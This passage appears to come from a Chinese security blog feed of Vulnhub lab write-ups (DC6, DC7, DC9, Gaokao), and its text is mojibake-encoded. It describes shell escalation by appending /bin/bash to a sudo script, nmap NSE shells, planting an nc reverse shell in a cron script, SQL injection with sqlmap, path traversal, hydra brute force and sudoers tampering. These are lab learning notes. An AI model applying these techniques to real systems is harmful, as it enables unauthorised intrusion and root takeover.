æ‰€æœ‰ç”¨æˆ·éƒ½æœ‰xæƒé™<br>ç„¶ååœ¨markç”¨æˆ·çš„æ–‡ä»¶å¤¹ä¸‹é¢æœ‰ä¸€ä¸ªstuffæ–‡ä»¶å¤¹ é‡Œé¢æœ‰ä¸€ä¸ªè´¦å·å¯†ç  å¯ä»¥ç™»å½•åˆ°ssh<br><img src="https://pic1.imgdb.cn/item/679a1d5cd0e0a243d4f87600.png"><br><code>graham@dc-6:~$ id</code><br><code>uid=1001(graham) gid=1001(graham) groups=1001(graham),1005(devs)</code><br>è¿™ä¸ªç”¨æˆ·æ˜¯å±äºdevsè¿™ä¸ªç»„çš„ æ‰€ä»¥æœ‰å†™å…¥æ–‡ä»¶çš„æƒé™<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87601.png" alt="|500"><br>å¯ä»¥å‘ç°è¿™ä¸ªç”¨æˆ·å¯ä»¥ä¸ç”¨å¯†ç å°±ç”¨jensç”¨æˆ·çš„åä¹‰æ‰§è¡Œåˆšæ‰çš„é‚£ä¸ªè„šæœ¬<br>æˆ‘ä»¬å…ˆåœ¨é‚£ä¸ªè„šæœ¬æ–‡ä»¶åé¢åŠ ä¸Š<code>graham@dc-6:~$ echo &quot;/bin/bash&quot; &gt;&gt; /home/jens/backups.sh</code><br>è¿™æ ·å­å°±å¯ä»¥è®©æ‰§è¡Œè„šæœ¬çš„äººè¿”å›shell   è¿™æ ·å­å°±æ‹¿åˆ°äº†jensçš„shell<br><img src="https://pic1.imgdb.cn/item/679a1d5dd0e0a243d4f87602.png" alt="|450"><br>è¿™ä¸ªç”¨æˆ·å¯ä»¥ç”¨rootèº«ä»½æ‰§è¡Œ nmap  æ‰€ä»¥ç”¨nmapææƒ<br>åœ¨ç½‘ä¸Šæ‰¾èµ„æ–™å å‘ç°nmapå¯ä»¥ç”¨srciptææƒ<br><img src="https://pic1.imgdb.cn/item/679a1d9dd0e0a243d4f87604.png" alt="|500"><br>æˆ–è€…å¯ä»¥æŠŠâ€™os.execute(â€œ&#x2F;bin&#x2F;bashâ€) å†™åˆ°ä¸€ä¸ªs.nseæ–‡ä»¶é‡Œ ç„¶åâ€“script ä¼ å…¥è¿™ä¸ªæ–‡ä»¶</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC7é¶åœºå¤ç›˜</title>
    <url>/posts/51728.html</url>
    <content><![CDATA[<p>vulnhub-DC7é¶åœºå¤ç›˜</p>
<span id="more"></span>
<p>æœ€éš¾çš„æ˜¯æœ€å¼€å§‹çš„ä¿¡æ¯æ”¶é›† ï¼ï¼ï¼ æ ¹æ®ç½‘ç«™æç¤ºçš„åˆ°å¤–éƒ¨æ‰¾ä¿¡æ¯ ä¸€ä¸‹ä¸‹é¢çš„D7user å»githubæ‰¾åˆ°<mark>æ•æ„Ÿä¿¡æ¯æ³„æ¼</mark></p>
<h2 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h2><p><img src="https://pic1.imgdb.cn/item/679a17c7d0e0a243d4f87577.png" alt="|250"><br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87578.png" alt="|400"><br>nmap -Aæ‰«æä¹‹åå‘ç°80ç«¯å£ä¸‹é¢çš„ç›®å½•ç»“æ„ å¹¶ä¸”çœ‹åˆ°httpæ˜¯ç”¨Drupal è¿™ä¸ªè½¯ä»¶æ”¯æŒçš„ ï¼ˆåé¢å›ç”¨åˆ°</p>
<h2 id="web-æ¢æµ‹-ä¿¡æ¯æ”¶é›†"><a href="#web-æ¢æµ‹-ä¿¡æ¯æ”¶é›†" class="headerlink" title="web æ¢æµ‹ + ä¿¡æ¯æ”¶é›†"></a>web æ¢æµ‹ + ä¿¡æ¯æ”¶é›†</h2><p>ç”¨dirsearchè·‘ä¸€ä¸‹ç›®å½• ä¹Ÿæ²¡æœ‰å‘ç°ä»€ä¹ˆæœ‰ç”¨çš„ç½‘é¡µ<br>é¡µé¢ä¸Šæœ‰ä¸€ä¸ªæœç´¢æ¡† ç”¨sqlmapå°è¯•å‘ç°æ²¡æœ‰æ³¨å…¥ç‚¹<br><img src="https://pic1.imgdb.cn/item/679a17c8d0e0a243d4f87579.png"><br>ç½‘ç«™é¦–é¡µæç¤ºäº†ç”¨ç›®å½•çˆ†ç ´ä¸ä¼šæˆåŠŸ å»å¤–é¢æ‰¾ä¿¡æ¯ â€“&gt; github<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757a.png" alt="|425"><br>åœ¨githubæˆåŠŸæ‰¾åˆ°äº†è¿™ä¸ªç”¨æˆ·<br><img src="https://pic1.imgdb.cn/item/679a17c9d0e0a243d4f8757b.png" alt="|450"><br>åœ¨config.php ä¸­æ‰¾åˆ°äº†ç”¨æˆ·åå’Œå¯†ç  å°è¯•åœ¨ç½‘ç«™ç™»å½•  å¤±è´¥  æˆ‘ä»¬å°±ç™»å½•ssh  æ‹¿åˆ°shell</p>
<h2 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h2><p><img src="https://pic1.imgdb.cn/item/679a1814d0e0a243d4f8758a.png" alt="|575"><br>å‘ç°æœ‰ä¸€ä¸ªå«åšmboxçš„æ–‡ä»¶ é‡Œé¢æ˜¯rootå‘é€çš„ å¹¶ä¸”å¥½åƒæ¯åäº”åˆ†é’Ÿå‘é€ä¸€æ¬¡<br>çœ‹ä¸€ä¸‹è¿™é‡Œçš„shé‡Œæœ‰ä»€ä¹ˆå†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">dc7user@dc-7:~$ <span class="built_in">cat</span> /opt/scripts/backups.sh</span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">cd</span> /var/www/html/</span><br><span class="line">drush sql-dump --result-file=/home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">cd</span> ..</span><br><span class="line">tar -czf /home/dc7user/backups/website.tar.gz html/</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric /home/dc7user/backups/website.tar.gz</span><br><span class="line"><span class="built_in">chown</span> dc7user:dc7user /home/dc7user/backups/*</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.sql</span><br><span class="line"><span class="built_in">rm</span> /home/dc7user/backups/website.tar.gz</span><br><span class="line">You have new mail <span class="keyword">in</span> /var/mail/dc7user</span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œçœ‹åˆ°æœ‰ç”¨åˆ°drushè¿™ä¸ªæœåŠ¡<br><img src="https://pic1.imgdb.cn/item/679a1815d0e0a243d4f8758e.png"><br>è€Œä¸”å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–‡ä»¶çš„å±ä¸»æ˜¯root  åªæœ‰www-dataè¿™ä¸ªç”¨æˆ·å¯ä»¥å†™å…¥ æˆ‘ä»¬åªæœ‰ä¸€ä¸ªè¯»æƒé™<br>ç°åœ¨æˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯æŠŠrootçš„shellç”¨nc -e åå¼¹åˆ°æœ¬æœº  å°±æ˜¯æŠŠè¿™ä¸ªè¯­å¥å†™åˆ°è¿™ä¸ªè„šæœ¬é‡Œé¢è®©ä»–æ‰§è¡Œ<br>ç°åœ¨çš„ç›®çš„å°±æ˜¯å¦‚ä½•æ‹¿åˆ°www-dataçš„shell   <mark>ç”¨drush</mark><br>æ ¹æ®æœç´¢çš„çŸ¥è¯† drushä¸€èˆ¬è¦åœ¨ç«™ç‚¹æ‰€åœ¨çš„ç›®å½•ä¸‹æ“ä½œ<br><code>cd /var/www/html     drush user-information admin </code><br> å¯ä»¥æŸ¥åˆ°ç®¡ç†çš„ä¿¡æ¯<br>ç„¶åå†ä¿®æ”¹ç®¡ç†çš„å¯†ç  ç™»å½•åˆ°webé‡Œé¢<br><img src="https://pic1.imgdb.cn/item/679a1816d0e0a243d4f87590.png" alt="|475"><br>ä½†æ˜¯å‘ç°è¿™é‡Œå’Œä¸Šä¸€ä¸ªé¶æœºä¸ä¸€æ · æ²¡æœ‰phpçš„é€‰é¡¹    æœç´¢èµ„æ–™çŸ¥é“å¯ä»¥å»ä¸‹è½½æ’ä»¶<br>åœ¨ç½‘é¡µä¸Šç”¨phpä»£ç  å†™ä¸Šåå¼¹shell<br>ç°åœ¨å°±æ˜¯ç”¨è¿™ä¸ªwwwç”¨æˆ·æŠŠåå¼¹shellè¯­å¥å†™åˆ°åˆšæ‰çš„é‚£ä¸ªè„šæœ¬ä¸­  ç„¶åç­‰åˆ°åäº”åˆ†çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œ<br>å®Œæˆï¼ï¼ </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>DC9é¶åœºå¤ç›˜</title>
    <url>/posts/14257.html</url>
    <content><![CDATA[<p>vulnhub-DC9é¶åœºå¤ç›˜</p>
<span id="more"></span>

<h1 id="ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†"><a href="#ç«¯å£æ‰«æ-ä¿¡æ¯æ”¶é›†" class="headerlink" title="ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†"></a>ç«¯å£æ‰«æ&#x2F;ä¿¡æ¯æ”¶é›†</h1><p>å…ˆnmapæ‰«ææœ¬æœº å‘ç°é¶æœºçš„åœ°å€  (è¿™é‡Œè™šæ‹Ÿæœºçš„ç½‘ç»œéƒ½è¦ç”¨æ¡¥æ¥æ¨¡å¼ï¼Œæ‰«ææœ¬æœºç½‘æ®µ)<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/28311c0ca1354b2e.png" alt="|450"><br>é¶æœºä¸€èˆ¬æ˜¯æœ€åæ•°å­—å¤§çš„ 192.168.240.171<br>æ¥ç€æ‰«æé¶æœº å‘ç°æœ‰ä¸¤ä¸ªç«¯å£ 22 å’Œ 80   22è¿˜æ˜¯è¢«é˜²ç«å¢™è¿‡æ»¤çš„<br>ç”¨dirsearch -u [ip]  æ‰«æç›®å½•     â€“&gt; æœ€åä»€ä¹ˆéƒ½æ²¡æœ‰æ‰«åˆ°</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>å‘ç°æœ‰ä¸€ä¸ªç™»å½•ç•Œé¢ ç”¨æˆ·åæ˜¯admin ç”¨bpçˆ†ç ´æ— æ³•å¾—åˆ°æ­£ç¡®çš„å¯†ç <br>å¹¶ä¸”searchæœ‰ä¸€ä¸ªè¾“å…¥æ¡†<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f81f33ccbd3d01ca.png" alt="|425"><img src="https://s3.bmp.ovh/imgs/2025/01/29/7a426990d44cebb4.png" alt="|475"><br>è¿™ä¸ªæœç´¢æ¡†æ˜¯ä¸€ä¸ªpostè¯·æ±‚  åœ¨è¿™é‡Œå¯ä»¥ä½¿ç”¨sqlmapè¿›è¡Œsqlæ³¨å…¥<br>åœ¨è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨-u å’Œ â€“data â€œsearch&#x3D;1â€ è¿™é‡Œæ˜¯postç±»å‹æ³¨å…¥ è‡ªåŠ¨ç”»æ“ä½œå†åŠ ä¸Šâ€“batch<br>æŸ¥è¯¢ä¹‹å åœ¨ä¸Šä¸€æ¡æŒ‡ä»¤åé¢åŠ ä¸Šâ€“dbså°±å¯ä»¥æŸ¥åˆ°æ•°æ®åº“<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/f9bc162ab156b944.png" alt="|525"><br>ä¸€æ­¥ä¸€æ­¥æ‰«æ åˆšæ‰æ˜¯æ•°æ®åº“ ç°åœ¨å°±æ˜¯æŒ‡å®šæ•°æ®åº“ æŸ¥è¡¨ åé¢å°±æ˜¯æŸ¥åˆ—<br>-D users â€“tables  - T *** â€“columns<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/158b8293575e9909.png" alt="|400"><br>ç°åœ¨è¦æŸ¥è¯¢ç”¨æˆ·åå’Œå¯†ç å­—æ®µ ç”¨-C â€œusername,passwordâ€ â€“dump<br><img src="https://s3.bmp.ovh/imgs/2025/01/29/340563e3e3b4f104.png" alt="|350"><br>æ‰¾åˆ°ä¸€ç³»åˆ—ç”¨æˆ·åå’Œå¯†ç <br>ç„¶åæˆ‘ä»¬å®šä½åˆ°csvæ–‡ä»¶é‡Œ ç”¨awk åšä¸€ä¸ªåˆ†å‰²  åˆ†åˆ«å­˜è¿›user.txt pass.txt<br>ç°åœ¨è¿™é‡Œæ²¡æœ‰ç±»ä¼¼adminä¹‹ç±»çš„ç”¨æˆ· æˆ‘ä»¬ç°åœ¨å»å¦å¤–ä¸€ä¸ªæ•°æ®åº“é‡Œç»§ç»­æŸ¥è¯¢<br>ç„¶åå¯ä»¥å‘ç°ä¸€ä¸ªadminç”¨æˆ·  å°†md5æ”¾åœ¨ç½‘ç«™ä¸­ç ´è§£<br>å¾—åˆ°å¯†ç ä¹‹å å¯ä»¥ç™»å½•ç½‘ç«™çš„managerç•Œé¢ åœ¨æ·»åŠ è®°å½•è¿™é‡Œå°è¯•æ·»åŠ â€™ # çœ‹çœ‹æœ‰æ²¡æœ‰æŠ¥é”™<br>å‘ç°åœ¨é‚®ç®±è¿™è¾¹ç¡®å®ä¼šå‡ºç°æŠ¥é”™<br><img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b1.png"><br> åŒæ—¶è¿˜å¯ä»¥çœ‹åˆ°ä¸å­˜åœ¨ â€“&gt; æ–‡ä»¶åŒ…å«æ¼æ´<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b2.png"><br> <mark>ä¸‹ä¸€æ­¥å°±è¦ç”¨webç™»å½•åˆ°æœåŠ¡å™¨</mark><br> æˆ‘ä»¬åœ¨urlè¿™é‡Œè¾“å…¥?file&#x3D; ..&#x2F;..&#x2F;etc&#x2F;passwd ä¸€ç›´å°è¯•ç›¸å¯¹è·¯å¾„<br> æ¥ç€ç”¨bpæ¥è·å–ä»–çš„çœŸå®è·¯å¾„   åœ¨bpæµè§ˆå™¨ä¸­ç™»å½•ç®¡ç†å‘˜è´¦æˆ·<br> <img src="https://pic1.imgdb.cn/item/6799dc7dd0e0a243d4f870b3.png"><br> åœ¨bpåŒ…ä¸­æŠŠfile&#x3D;åé¢åŠ ä¸Š$  ç„¶ååœ¨payloadé‡Œé¢åŠ ä¸Šç›¸å¯¹è·¯å¾„<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b4.png" alt="|500"><br> æ ¹æ®è¿”å›çš„é•¿åº¦å°±å¯ä»¥å¾—åˆ°çœŸå®è·¯å¾„<br> <img src="https://pic1.imgdb.cn/item/6799dc7ed0e0a243d4f870b5.png" alt="|500"><br> ç„¶åæˆ‘ä»¬åˆ°çœŸå®çš„è·¯å¾„ä¸‹é¢ å› ä¸ºçŸ¥é“æœ‰sshæœåŠ¡ æ‰€ä»¥å¯ä»¥æŸ¥çœ‹sshé…ç½®æ–‡ä»¶  å‘ç°ä¸å…è®¸rootç™»å½• listenä¹Ÿæ²¡æœ‰é…ç½®<br> å› ä¸ºä¹‹å‰æˆ‘ä»¬çŸ¥é“22ç«¯å£è¢«é˜²ç«å¢™è¿‡æ»¤äº† æˆ‘ä»¬çŒœæµ‹æœ‰knockdæœåŠ¡ åœ¨&#x2F;proc&#x2F;sched_debug é‡Œé¢å¯ä»¥çœ‹åˆ°æ‰€ä»¥é…ç½®çš„æœåŠ¡<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870ba.png" alt="|475"><br> æŠŠè¿™äº›ä¿¡æ¯éƒ½æ”¾åˆ°kali a.txt ç”¨æ­£åˆ™è¡¨è¾¾å¼è¿‡æ»¤ cat a.txt | egrep â€˜[a-zA-z]+â€™ è¿™æ ·å­å¯ä»¥æœç´¢æœåŠ¡ -oè¾“å‡ºåŒ¹é…å†…å®¹ åœ¨sortæ’åº ï¼ˆè¿˜å¯ä»¥uniqå»é‡ï¼‰ å‘ç°æœ‰knockdè¿™ä¸ªæœåŠ¡<br> ç„¶åè®¿é—®etc&#x2F;knockd.conf<br> <img src="https://pic1.imgdb.cn/item/6799dce1d0e0a243d4f870bb.png"><br> å¯ä»¥çœ‹åˆ°knockæœåŠ¡çš„è®¿é—®é¡ºåºæ˜¯ 9842 8475 7469   ç„¶åç”¨ncæˆ–è€…kaliè‡ªå¸¦çš„knock(æ³¨æ„æ²¡æœ‰dæ¥è®¿é—®<br> ç„¶åæˆ‘ä»¬å°±å‘ç°è¿™ä¸ª22ç«¯å£ç°åœ¨å·²ç»å¼€æ”¾äº†<br> ç°åœ¨ç”¨åˆšæ‰çš„user å’Œ passæ–‡ä»¶  ç”¨hydraçˆ†ç ´<br> hydra -L user.txt -P pass.txt ssh:&#x2F;&#x2F;192.168.240.171</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>ç„¶åæ‹¿åˆ°ä¸€äº›æ™®é€šç”¨æˆ· æˆ‘ä»¬è¿›å»çœ‹çœ‹æœ‰ä»€ä¹ˆæ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cc.png" alt="|475"><br>ç™»å½•ä¹‹åæ²¡æœ‰å‘ç°ä»€ä¹ˆä»»ä½•æ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/6799ddc3d0e0a243d4f870cd.png" alt="|450"><br>æˆ‘ä»¬è¦è¾“å…¥<mark>sudo -l</mark> æŸ¥çœ‹æ˜¯å¦æœ‰ä»€ä¹ˆæ–‡ä»¶å¤¹æœ‰rootæƒé™ å‘ç°è¿™ä¸ªç”¨æˆ·ä»€ä¹ˆéƒ½æ²¡æœ‰<br>ç™»å½•åˆ°æœ€åä¸€ä¸ªè´¦æˆ·é‡Œé¢å‘ç°æœ‰ä¸€ä¸ªæ–°çš„æ–‡ä»¶ é‡Œé¢æœ‰æ–°çš„å¯†ç <br><img src="https://pic1.imgdb.cn/item/6799dce5d0e0a243d4f870bd.png" alt="|475"><br>æŠŠè¿™äº›å¯†ç æ”¾åˆ°pass.txt ä¸­ å†ç”¨hydra è·‘ä¸€é<br>ç™»å…¥åˆ°æ–°çš„ç”¨æˆ·<br>è¾“å…¥root -l ä¹‹åå‘ç°æœ‰ä¸€ä¸ªrootç»„çš„æ–‡ä»¶<br><img src="https://pic1.imgdb.cn/item/6799dce4d0e0a243d4f870bc.png" alt="|525"><br><img src="https://pic1.imgdb.cn/item/6799dce6d0e0a243d4f870be.png" alt="|375"><br>è¿™ä¸ªè„šæœ¬æ¥å—ä¸¤ä¸ªå‚æ•° è¯»ç¬¬ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ ç„¶åæ·»åŠ åˆ°ç¬¬äºŒä¸ªæ–‡ä»¶é‡Œ<br>æˆ‘ä»¬ç°åœ¨å°±åŠ åˆ°etc&#x2F;sudoers æ·»åŠ æƒé™   ç°åœ¨å°±æ–°å»ºä¸€ä¸ªæ–‡ä»¶å¤¹ ç„¶åæ·»åŠ rootçš„æƒé™(ALL&#x3D;(ALL:ALL) ALL)<br>è¿™é‡Œæˆ‘ä»¬è¦åœ¨ä¸»æ–‡ä»¶å¤¹ä¸‹é¢å†™è¿™ä¸ªæ–‡ä»¶  å› ä¸ºåˆšæ‰testè„šæœ¬åœ¨çš„åœ°æ–¹æ˜¯æœ‰rootæƒé™çš„<br>ç„¶åç”¨åˆšæ‰çš„è„šæœ¬æŠŠa.txt å†™å…¥ etc&#x2F;sudoers<br>è¾“å…¥sudo su -<br><img src="https://pic1.imgdb.cn/item/6799dd8bd0e0a243d4f870c9.png" alt="|400"><br>è§£å†³ï¼ï¼</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="EBNF"><figure class="iseeu highlight /ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">codeblock</span></span><br></pre></td></tr></table></figure></div>]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Gaokao</title>
    <url>/posts/58538.html</url>
    <content><![CDATA[<p>Vulnhub-Gaokaoé¶æœºå¤ç›˜</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.179.139    </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">09</span> <span class="number">18</span>:<span class="number">21</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">179.139</span> (<span class="number">192.168</span>.<span class="number">179.139</span>)</span><br><span class="line">Host is up (<span class="number">0.0021</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">996</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">21</span><span class="symbol">/tcp</span>   open  ftp     ProFTPD <span class="number">1.3</span>.<span class="number">5</span>e</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span>   open  ssh     OpenSSH <span class="number">7.6</span>p1 Ubuntu <span class="number">4</span>ubuntu0.<span class="number">3</span> (Ubuntu Linux; protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">48</span>:<span class="number">39</span>:<span class="number">31</span>:<span class="number">22</span>:fb:c2:<span class="number">03</span>:<span class="number">44</span>:a7:<span class="number">4</span>e:c0:fa:b8:ad:<span class="number">2</span>f:<span class="number">96</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">70</span>:a7:<span class="number">74</span>:<span class="number">5</span>e:a3:<span class="number">79</span>:<span class="number">60</span>:<span class="number">28</span>:<span class="number">1</span>a:<span class="number">45</span>:<span class="number">4</span>c:ab:<span class="number">5</span>c:e7:<span class="number">87</span>:ad (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">9</span>c:<span class="number">35</span>:ce:f6:<span class="number">59</span>:<span class="number">66</span>:<span class="number">7</span>f:ae:c4:d1:<span class="number">21</span>:<span class="number">16</span>:d5:aa:<span class="number">56</span>:<span class="number">71</span> (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http    Apache httpd <span class="number">2.4</span>.<span class="number">29</span> ((Ubuntu))</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.29</span> (Ubuntu)</span><br><span class="line">|<span class="params">_http-title:</span> Wellcome to <span class="params">Funbox:</span> Gaokao <span class="operator">!</span></span><br><span class="line"><span class="number">3306</span><span class="symbol">/tcp</span> open  mysql   MySQL <span class="number">5.7</span>.<span class="number">3</span>4-<span class="number">0</span>ubuntu0.<span class="number">18.04</span>.<span class="number">1</span></span><br><span class="line">| <span class="params">mysql-info:</span> </span><br><span class="line">|   <span class="params">Protocol:</span> <span class="number">10</span></span><br><span class="line">|   <span class="params">Version:</span> <span class="number">5.7</span>.<span class="number">3</span>4-<span class="number">0</span>ubuntu0.<span class="number">18.04</span>.<span class="number">1</span></span><br><span class="line">|   Thread <span class="params">ID:</span> <span class="number">3</span></span><br><span class="line">|   Capabilities <span class="params">flags:</span> <span class="number">65535</span></span><br><span class="line">|   Some <span class="params">Capabilities:</span> LongPassword, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, SwitchToSSLAfterHandshake, FoundRows, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsLoadDataLocal, Speaks41ProtocolNew, LongColumnFlag, Support41Auth, InteractiveClient, IgnoreSigpipes, SupportsTransactions, ODBCClient, SupportsCompression, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments</span><br><span class="line">|   <span class="params">Status:</span> Autocommit</span><br><span class="line">|   <span class="params">Salt:</span> k%\x0E5s72S\x1B<span class="operator">!</span><span class="operator">+</span>\x1F26p\x1C\x02I0T</span><br><span class="line">|_  Auth Plugin <span class="params">Name:</span> mysql_native_password</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">32</span>:<span class="number">5</span>F:D8:FC:<span class="number">12</span>:<span class="number">14</span> (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OSs:</span> Unix, Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.11</span> ms <span class="number">192.168</span>.<span class="number">179.139</span> (<span class="number">192.168</span>.<span class="number">179.139</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">36.03</span> seconds</span><br></pre></td></tr></table></figure></div>

<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><p>webç«¯æ˜¯ä¸€ä¸ªé»˜è®¤çš„ubuntuç•Œé¢ï¼Œè¯´æ˜åªæ˜¯å¼€æ”¾äº†httpæœåŠ¡ï¼Œä½†æ˜¯æ²¡æœ‰å†…å®¹.<br>ftpå¯ä»¥åŒ¿åç™»å½•,æŠŠè¿™ä¸ªwelcomeä¸‹è½½ä¸‹æ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ftp anonymous@192.168.179.139</span></span><br><span class="line">Connected <span class="built_in">to</span> <span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>.</span><br><span class="line"><span class="number">220</span> ProFTPD <span class="number">1.3</span><span class="number">.5</span>e Server (Debian) [::ffff:<span class="number">192.168</span><span class="number">.179</span><span class="number">.139</span>]</span><br><span class="line"><span class="number">331</span> Anonymous login ok, <span class="built_in">send</span> your complete email address <span class="keyword">as</span> your password</span><br><span class="line">Password: </span><br><span class="line"><span class="number">230</span>-Welcome, archive user anonymous@<span class="number">192.168</span><span class="number">.179</span><span class="number">.83</span> !</span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span>-The <span class="built_in">local</span> <span class="built_in">time</span> is: Sun Feb <span class="number">09</span> <span class="number">10</span>:<span class="number">23</span>:<span class="number">22</span> <span class="number">2025</span></span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span>-This is <span class="keyword">an</span> experimental FTP server.  If you have <span class="keyword">any</span> unusual problems,</span><br><span class="line"><span class="number">230</span>-please report them via e-mail <span class="built_in">to</span> &lt;sky@funbox9&gt;.</span><br><span class="line"><span class="number">230</span>-</span><br><span class="line"><span class="number">230</span> Anonymous access granted, restrictions apply</span><br><span class="line">Remote <span class="keyword">system</span> type is UNIX.</span><br><span class="line">Using binary mode <span class="built_in">to</span> transfer <span 